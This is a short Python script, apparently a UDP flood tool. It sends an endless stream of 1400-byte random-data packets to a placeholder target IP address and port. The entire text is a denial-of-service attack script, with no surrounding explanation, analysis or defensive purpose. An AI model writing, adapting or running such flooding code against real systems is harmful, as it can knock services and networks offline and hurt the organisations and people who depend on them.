import socket
import time
import os
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
m=os.urandom(1400)
i="target_ip"
p=portnum
a=(i, p)
while True:
   s.sendto(m, a)
